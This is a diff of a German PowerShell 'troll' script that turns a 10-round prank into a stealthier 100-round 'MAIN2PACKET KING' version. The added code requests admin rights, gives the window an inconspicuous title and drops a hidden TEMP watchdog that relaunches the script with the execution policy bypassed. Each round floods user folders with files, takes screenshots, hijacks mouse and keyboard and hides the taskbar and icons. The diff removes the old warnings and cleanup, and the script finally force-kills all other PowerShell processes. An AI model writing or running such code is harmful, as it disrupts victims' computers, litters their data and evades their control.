@@ -1,5 +1,5 @@
 # ================================
-# ULTIMATIVE 20-in-1 TROLL KOLLEKTION - NUR TASKMANAGER
+# ULTIMATIVE 20-in-1 TROLL KOLLEKTION - MAIN2PACKET KING
 # ================================
 
 # Administrator-Rechte anfordern
@@ -8,197 +8,176 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
-# ===== SCHUTZ MECHANISMUS =====
-# Versteckter Watchdog der das Skript neu startet wenn geschlossen
-$watchdogScript = @"
-while(`$true) {
-    `$powershell = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.Id -ne `$parentPid}
-    if (`$powershell.Count -eq 0) {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`""
-    }
-    Start-Sleep -Seconds 3
-}
-"@
-
-# Watchdog im Hintergrund starten (mit Parent PID)
-$parentPid = $pid
-$watchdogScript = $watchdogScript -replace '\$parentPid', $parentPid
-$watchdogScript | Out-File "$env:TEMP\watchdog.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog.ps1`""
+# ===== ERROR HANDLING =====
+$ErrorActionPreference = "SilentlyContinue"
+$Host.UI.RawUI.WindowTitle = "Main2packet System"  # Unauffälliger Titel
 
 # ===== KONFIGURATION =====
 $global:trollActive = $true
 $global:currentRound = 0
-$global:maxRounds = 10
+$global:maxRounds = 100
 $desktop = [Environment]::GetFolderPath("Desktop")
 $documents = [Environment]::GetFolderPath("MyDocuments")
 $music = [Environment]::GetFolderPath("MyMusic")
 $pictures = [Environment]::GetFolderPath("MyPictures")
 $videos = [Environment]::GetFolderPath("MyVideos")
 
-# ===== TASKMANGELER-WARNUNG =====
+# ===== WATCHDOG =====
+$watchdogScript = @"
+while(`$true) {
+    `$powershell = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.Id -ne $pid}
+    if (`$powershell.Count -eq 0) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    }
+    Start-Sleep -Seconds 5
+}
+"@
+$watchdogScript | Out-File "$env:TEMP\main2packet.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\main2packet.ps1`""
+
+# ===== START =====
 Clear-Host
 Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-Write-Host "║    🎮 ULTIMATIVE 20-in-1 TROLL KOLLEKTION  ║" -ForegroundColor Red
-Write-Host "║         💀 NUR TASKMANAGER STOPPT MICH     ║" -ForegroundColor Red
+Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
 Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
 Write-Host ""
-Write-Host "📊 Runden: $global:maxRounds" -ForegroundColor Yellow
-Write-Host "💀 Schließen bringt nichts - Watchdog startet neu!" -ForegroundColor Red
-Write-Host "🔫 Nur Taskmanager killt mich (alle PowerShell Prozesse)" -ForegroundColor Cyan
+Write-Host "📊 Fortschritt: 0/$global:maxRounds" -ForegroundColor Yellow
 Write-Host ""
-Start-Sleep -Seconds 4
+Start-Sleep -Seconds 2
 
-# Hauptschleife
-while ($global:currentRound -lt $global:maxRounds -and $global:trollActive) {
+# Hauptschleife - 100 MAL!
+while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
     
-    Write-Host "`n════════════════════════════════════════════" -ForegroundColor Magenta
-    Write-Host "ROUNDE $global:currentRound von $global:maxRounds" -ForegroundColor Magenta
-    Write-Host "════════════════════════════════════════════`n" -ForegroundColor Magenta
-    
-    # TROLL 1: Desktop Dateien (30 Stück)
-    Write-Host "[1/20] 📂 Desktop-Troll: 30 Dateien werden erstellt..." -ForegroundColor Green
-    for ($i = 1; $i -le 30; $i++) {
-        $filePath = Join-Path $desktop "TROLL_$global:currentRound`_$i.txt"
-        "😈 Runde $global:currentRound - Datei $i" | Out-File $filePath -Encoding UTF8
+    # Fortschritt ANZEIGEN
+    if ($global:currentRound -le $global:maxRounds) {
+        Clear-Host
+        Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
+        Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
+        Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
+        Write-Host ""
+        Write-Host "📊 Fortschritt: $global:currentRound/$global:maxRounds" -ForegroundColor Green
+        Write-Host ""
     }
-    Start-Sleep -Seconds 1
     
-    # TROLL 2: Ordner-Troll (15 Ordner)
-    Write-Host "[2/20] 📁 Ordner-Troll: 15 Zufallsordner werden erstellt..." -ForegroundColor Green
-    for ($i = 1; $i -le 15; $i++) {
-        $name = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
-        New-Item -Path "$desktop\ORDNER_$name" -ItemType Directory -Force | Out-Null
+    # TROLL 1: Desktop Dateien - MAIN2PACKET KING
+    Write-Host "[1/20] 📂 Phase 1..." -ForegroundColor Green
+    for ($i = 1; $i -le 10; $i++) {
+        $filePath = Join-Path $desktop "MAIN2PACKET_KING_$global:currentRound`_$i.king"
+        "👑 Main2packet King - Datei $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
-    Start-Sleep -Seconds 1
     
-    # TROLL 3: Maus-Troll (20 Mal)
-    Write-Host "[3/20] 🖱️ Maus-Troll: Maus wird verrückt (20x)..." -ForegroundColor Green
+    # TROLL 2: Ordner - MAIN2PACKET KING
+    Write-Host "[2/20] 📁 Phase 2..." -ForegroundColor Green
+    for ($i = 1; $i -le 5; $i++) {
+        $name = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
+        New-Item -Path "$desktop\MAIN2PACKET_KING_$name" -ItemType Directory -Force | Out-Null
+    }
+    
+    # TROLL 3: Maus kurz
+    Write-Host "[3/20] 🖱️ Phase 3..." -ForegroundColor Green
     Add-Type -AssemblyName System.Windows.Forms
-    for ($i = 1; $i -le 20; $i++) {
+    for ($i = 1; $i -le 5; $i++) {
         [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point (
-            (Get-Random -Min 0 -Max 1920),
-            (Get-Random -Min 0 -Max 1080)
+            (Get-Random -Min 100 -Max 1000),
+            (Get-Random -Min 100 -Max 700)
         )
         Start-Sleep -Milliseconds 100
     }
     
-    # TROLL 4: Sound-Troll (alle Sounds)
-    Write-Host "[4/20] 🔊 Sound-Troll: Alle System-Sounds..." -ForegroundColor Green
+    # TROLL 4: Sound
+    Write-Host "[4/20] 🔊 Phase 4..." -ForegroundColor Green
     Add-Type -AssemblyName System.Media
-    $sounds = @("SystemAsterisk", "SystemExclamation", "SystemHand", "SystemQuestion")
-    foreach ($sound in $sounds) {
-        [System.Media.SystemSounds]::$sound.Play()
-        Start-Sleep -Milliseconds 300
-    }
+    $sounds = @("SystemAsterisk", "SystemExclamation", "SystemHand")
+    $sound = Get-Random $sounds
+    [System.Media.SystemSounds]::$sound.Play()
     
-    # TROLL 5: Tasten-Sperrer (10x)
-    Write-Host "[5/20] 🔒 Tasten-Troll: Caps/Num/Scroll 10x..." -ForegroundColor Green
+    # TROLL 5: Tasten
+    Write-Host "[5/20] 🔒 Phase 5..." -ForegroundColor Green
     $wsh = New-Object -ComObject WScript.Shell
-    for ($i = 1; $i -le 10; $i++) {
-        $wsh.SendKeys('{CAPSLOCK}')
-        $wsh.SendKeys('{NUMLOCK}')
-        $wsh.SendKeys('{SCROLLLOCK}')
-        Start-Sleep -Milliseconds 200
-    }
+    $wsh.SendKeys('{CAPSLOCK}')
+    Start-Sleep -Milliseconds 100
+    $wsh.SendKeys('{NUMLOCK}')
+    Start-Sleep -Milliseconds 100
     
-    # TROLL 6: Screenshot-Troll (5 Stück)
-    Write-Host "[6/20] 📸 Screenshot-Troll: 5 Screenshots..." -ForegroundColor Green
+    # TROLL 6: Screenshot mit MAIN2PACKET KING Namen
+    Write-Host "[6/20] 📸 Phase 6..." -ForegroundColor Green
     Add-Type -AssemblyName System.Windows.Forms
-    for ($s = 1; $s -le 5; $s++) {
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-        $date = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
-        $bitmap.Save("$desktop\screenshot_$date`_$s.png")
-        $graphics.Dispose()
-        $bitmap.Dispose()
-        Start-Sleep -Milliseconds 300
-    }
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+    $graphics = [Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+    $bitmap.Save("$desktop\MAIN2PACKET_KING_SS$global:currentRound.png")
+    $graphics.Dispose()
+    $bitmap.Dispose()
     
-    # TROLL 7: Popup-Troll (5 Popups)
-    Write-Host "[7/20] 💬 Popup-Troll: 5 Nachrichten..." -ForegroundColor Green
+    # TROLL 7: Popup mit MAIN2PACKET KING
+    Write-Host "[7/20] 💬 Phase 7..." -ForegroundColor Green
     $popup = New-Object -ComObject Wscript.Shell
-    $popup.Popup("😈 RUNDE $global:currentRound", 1, "TROLL", 64)
-    $popup.Popup("🔥 NOCH $($global:maxRounds - $global:currentRound) RUNDEN", 1, "TROLL", 48)
-    $popup.Popup("💀 TASKMANAGER ODER NICHTS!", 1, "TROLL", 16)
-    $popup.Popup("🔫 KILL ALLE POWERSHELLS", 1, "TROLL", 32)
-    $popup.Popup("🎮 VIEL SPASS!", 1, "TROLL", 64)
+    $popup.Popup("👑 MAIN2PACKET KING - Runde $global:currentRound/$global:maxRounds", 1, "KING SYSTEM", 64)
     
-    # TROLL 8: Hintergrund-Troll (alle Farben)
-    Write-Host "[8/20] 🎨 Hintergrund-Troll: Farb-Explosion..." -ForegroundColor Green
-    $colors = @("Red", "Green", "Blue", "Yellow", "Cyan", "Magenta", "Black", "DarkRed", "DarkBlue", "DarkGreen")
-    foreach ($color in $colors) {
-        $Host.UI.RawUI.BackgroundColor = $color
-        Clear-Host
-        Write-Host "🎨 FARBE: $color" -ForegroundColor White
-        Write-Host "💀 Nur Taskmanager stoppt mich!" -ForegroundColor Yellow
-        Start-Sleep -Milliseconds 200
+    # TROLL 8: Farbwechsel
+    Write-Host "[8/20] 🎨 Phase 8..." -ForegroundColor Green
+    $colors = @("Red", "Green", "Blue", "Yellow", "Cyan", "Magenta")
+    $color = Get-Random $colors
+    $Host.UI.RawUI.BackgroundColor = $color
+    Clear-Host
+    
+    # TROLL 9: Kopien mit MAIN2PACKET KING
+    Write-Host "[9/20] 📋 Phase 9..." -ForegroundColor Green
+    for ($i = 1; $i -le 3; $i++) {
+        $filePath = Join-Path $desktop "MAIN2PACKET_KING_COPY_$global:currentRound`_$i.king"
+        "👑 Kopie Nr. $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
     
-    # TROLL 9: Datei-Kopierer (20 Kopien)
-    Write-Host "[9/20] 📋 Datei-Kopierer: 20 Kopien..." -ForegroundColor Green
-    for ($i = 1; $i -le 20; $i++) {
-        $filePath = Join-Path $desktop "COPY_TROLL_$global:currentRound`_$i.troll"
-        "😈 Kopie Nr. $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
-    }
-    
-    # TROLL 10: Auto-Typing (alle Texte)
-    Write-Host "[10/20] ⌨️ Auto-Typing: Simuliere Tastatur..." -ForegroundColor Green
+    # TROLL 10: Auto-Typing
+    Write-Host "[10/20] ⌨️ Phase 10..." -ForegroundColor Green
     $wsh = New-Object -ComObject WScript.Shell
-    $texts = @("Du wurdest getrollt! ", "Haha! ", "Taskmanager only! ", "Viel Spaß! ", "Nicht zu stoppen! ")
-    foreach ($text in $texts) {
-        $wsh.SendKeys($text)
-        Start-Sleep -Milliseconds 400
+    $wsh.SendKeys('Main2packet King... ')
+    
+    # TROLL 11: Dokumente mit MAIN2PACKET KING
+    Write-Host "[11/20] 📄 Phase 11..." -ForegroundColor Green
+    for ($i = 1; $i -le 3; $i++) {
+        $filePath = Join-Path $documents "MAIN2PACKET_KING_DOC_$global:currentRound`_$i.king"
+        "👑 Dokument $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
     
-    # TROLL 11: Dokumente-Troll
-    Write-Host "[11/20] 📄 Dokumente-Troll: 10 Dateien in Dokumenten..." -ForegroundColor Green
-    for ($i = 1; $i -le 10; $i++) {
-        $filePath = Join-Path $documents "TROLL_DOC_$global:currentRound`_$i.txt"
-        "😈 Dokumente-Troll Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
+    # TROLL 12: Musik mit MAIN2PACKET KING
+    Write-Host "[12/20] 🎵 Phase 12..." -ForegroundColor Green
+    New-Item -Path "$music\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
+    
+    # TROLL 13: Bilder mit MAIN2PACKET KING
+    Write-Host "[13/20] 🖼️ Phase 13..." -ForegroundColor Green
+    New-Item -Path "$pictures\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
+    
+    # TROLL 14: Videos mit MAIN2PACKET KING
+    Write-Host "[14/20] 🎬 Phase 14..." -ForegroundColor Green
+    New-Item -Path "$videos\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
+    
+    # TROLL 15: CD Laufwerk (nur einmal)
+    if ($global:currentRound -eq 1) {
+        Write-Host "[15/20] 💿 Phase 15..." -ForegroundColor Green
+        $shell = New-Object -ComObject Shell.Application
+        $shell.NameSpace(17).Self.InvokeVerb("eject") 2>$null
+        Start-Sleep -Milliseconds 500
+        $shell.NameSpace(17).Self.InvokeVerb("eject") 2>$null
+    } else {
+        Write-Host "[15/20] 💿 Phase 15..." -ForegroundColor DarkGray
     }
     
-    # TROLL 12: Musik-Troll
-    Write-Host "[12/20] 🎵 Musik-Troll: 5 Musikordner..." -ForegroundColor Green
-    for ($i = 1; $i -le 5; $i++) {
-        New-Item -Path "$music\TROLL_MUSIC_$global:currentRound`_$i" -ItemType Directory -Force | Out-Null
+    # TROLL 16: Lautstärke
+    Write-Host "[16/20] 🔊 Phase 16..." -ForegroundColor Green
+    for ($v = 1; $v -le 3; $v++) {
+        $wsh.SendKeys([char]174)
+        Start-Sleep -Milliseconds 50
+    }
+    for ($v = 1; $v -le 3; $v++) {
+        $wsh.SendKeys([char]175)
+        Start-Sleep -Milliseconds 50
     }
     
-    # TROLL 13: Bilder-Troll
-    Write-Host "[13/20] 🖼️ Bilder-Troll: 5 Bildordner..." -ForegroundColor Green
-    for ($i = 1; $i -le 5; $i++) {
-        New-Item -Path "$pictures\TROLL_PICS_$global:currentRound`_$i" -ItemType Directory -Force | Out-Null
-    }
-    
-    # TROLL 14: Videos-Troll
-    Write-Host "[14/20] 🎬 Videos-Troll: 5 Videoordner..." -ForegroundColor Green
-    for ($i = 1; $i -le 5; $i++) {
-        New-Item -Path "$videos\TROLL_VIDS_$global:currentRound`_$i" -ItemType Directory -Force | Out-Null
-    }
-    
-    # TROLL 15: CD-Laufwerk-Troll
-    Write-Host "[15/20] 💿 CD-Troll: Öffne CD-Laufwerk..." -ForegroundColor Green
-    $shell = New-Object -ComObject Shell.Application
-    $shell.NameSpace(17).Self.InvokeVerb("eject") 2>$null
-    Start-Sleep -Seconds 1
-    $shell.NameSpace(17).Self.InvokeVerb("eject") 2>$null # Wieder schließen
-    
-    # TROLL 16: Lautstärke-Troll
-    Write-Host "[16/20] 🔊 Lautstärke-Troll: Lautstärke hoch/runter..." -ForegroundColor Green
-    for ($vol = 1; $vol -le 10; $vol++) {
-        $wsh.SendKeys([char]174) # Leiser
-        Start-Sleep -Milliseconds 100
-    }
-    for ($vol = 1; $vol -le 10; $vol++) {
-        $wsh.SendKeys([char]175) # Lauter
-        Start-Sleep -Milliseconds 100
-    }
-    
-    # TROLL 17: Taskleisten-Troll
-    Write-Host "[17/20] 📊 Taskleisten-Troll: Verstecke/Zeige Taskleiste..." -ForegroundColor Green
+    # TROLL 17: Taskleiste
+    Write-Host "[17/20] 📊 Phase 17..." -ForegroundColor Green
     $signature = @'
 [DllImport("user32.dll")]
 public static extern IntPtr FindWindow(string className, string windowName);
@@ -207,43 +186,28 @@ public static extern int ShowWindow(IntPtr hwnd, int nCmdShow);
 '@
     $type = Add-Type -MemberDefinition $signature -Name Win32Utils -Namespace Win32 -PassThru
     $hwnd = $type::FindWindow("Shell_TrayWnd", $null)
-    for ($i = 1; $i -le 3; $i++) {
-        $type::ShowWindow($hwnd, 0) # Verstecken
-        Start-Sleep -Milliseconds 300
-        $type::ShowWindow($hwnd, 1) # Zeigen
-        Start-Sleep -Milliseconds 300
-    }
+    $type::ShowWindow($hwnd, 0)
+    Start-Sleep -Milliseconds 200
+    $type::ShowWindow($hwnd, 1)
     
-    # TROLL 18: Fenster-Troll
-    Write-Host "[18/20] 🪟 Fenster-Troll: Alle Fenster minimieren/maximieren..." -ForegroundColor Green
+    # TROLL 18: Fenster minimieren
+    Write-Host "[18/20] 🪟 Phase 18..." -ForegroundColor Green
     $shell = New-Object -ComObject "Shell.Application"
-    for ($i = 1; $i -le 3; $i++) {
-        $shell.MinimizeAll()
-        Start-Sleep -Milliseconds 300
-        $shell.UndoMinimizeALL()
-        Start-Sleep -Milliseconds 300
-    }
+    $shell.MinimizeAll()
+    Start-Sleep -Milliseconds 200
+    $shell.UndoMinimizeALL()
     
-    # TROLL 19: Bildschirm-Auflösung (kurzer Effekt)
-    Write-Host "[19/20] 🖥️ Bildschirm-Troll: Bildschirm flackert..." -ForegroundColor Green
-    Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Display {
-    [DllImport("user32.dll")]
-    public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
-}
-"@ -ErrorAction SilentlyContinue
-    # Simuliert kurzes Flackern
-    for ($i = 1; $i -le 5; $i++) {
+    # TROLL 19: Flackern
+    Write-Host "[19/20] 🖥️ Phase 19..." -ForegroundColor Green
+    for ($f = 1; $f -le 3; $f++) {
         [Console]::CursorVisible = $false
-        Start-Sleep -Milliseconds 50
+        Start-Sleep -Milliseconds 30
         [Console]::CursorVisible = $true
-        Start-Sleep -Milliseconds 50
+        Start-Sleep -Milliseconds 30
     }
     
-    # TROLL 20: Desktop-Icons-Troll
-    Write-Host "[20/20] 🖼️ Desktop-Icons: Icons werden versteckt..." -ForegroundColor Green
+    # TROLL 20: Icons
+    Write-Host "[20/20] 🖼️ Phase 20..." -ForegroundColor Green
     $signature = @'
 [DllImport("user32.dll")]
 public static extern IntPtr FindWindow(string className, string windowName);
@@ -256,39 +220,19 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     $progman = $type::FindWindow("Progman", $null)
     $defview = $type::FindWindowEx($progman, [IntPtr]::Zero, "SHELLDLL_DefView", $null)
     if ($defview -ne [IntPtr]::Zero) {
-        $type::ShowWindow($defview, 0) # Verstecken
-        Start-Sleep -Milliseconds 500
-        $type::ShowWindow($defview, 1) # Zeigen
+        $type::ShowWindow($defview, 0)
+        Start-Sleep -Milliseconds 200
+        $type::ShowWindow($defview, 1)
     }
     
-    Write-Host "`n✅ RUNDE $global:currentRound ABGESCHLOSSEN!" -ForegroundColor Yellow
-    Write-Host "Nächste Runde in 3 Sekunden..." -ForegroundColor Cyan
-    Write-Host "💀 Watchdog läuft - Schließen bringt nichts!" -ForegroundColor Red
-    Write-Host "🔫 Taskmanager: Alle PowerShell-Prozesse killen!" -ForegroundColor Magenta
-    Start-Sleep -Seconds 3
+    # Kurze Pause zwischen Runden
+    Start-Sleep -Seconds 1
 }
 
-# ===== AUFRÄUMEN NACH LETZTER RUNDE =====
-Write-Host "`n🧹 Letzte Runde vorbei - Räume ALLES auf..." -ForegroundColor Yellow
-
-# ALLES LÖSCHEN
-Get-ChildItem $desktop -Filter "TROLL_*.txt" | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem $desktop -Filter "ORDNER_*" -Directory | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-Get-ChildItem $desktop -Filter "*.troll" | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem $desktop -Filter "screenshot_*.png" | Remove-Item -Force -ErrorAction SilentlyContinue
-
-Get-ChildItem $documents -Filter "TROLL_DOC_*" -File | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem $music -Filter "TROLL_MUSIC_*" -Directory | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-Get-ChildItem $pictures -Filter "TROLL_PICS_*" -Directory | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-Get-ChildItem $videos -Filter "TROLL_VIDS_*" -Directory | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-
-# Watchdog löschen und beenden
-if (Test-Path "$env:TEMP\watchdog.ps1") {
-    Remove-Item "$env:TEMP\watchdog.ps1" -Force -ErrorAction SilentlyContinue
-}
+# ===== STILLES ENDE =====
+# Watchdog beenden
 Get-Process -Name "powershell" | Where-Object {$_.Id -ne $pid} | Stop-Process -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\main2packet.ps1" -Force -ErrorAction SilentlyContinue
 
-Write-Host "✅ ALLES ENTFERNT! Der Troll ist vorbei." -ForegroundColor Green
-Write-Host "🔫 Taskmanager war der einzige Ausweg!" -ForegroundColor Cyan
-Write-Host ""
-Start-Sleep -Seconds 5
+# Still beenden
+exit
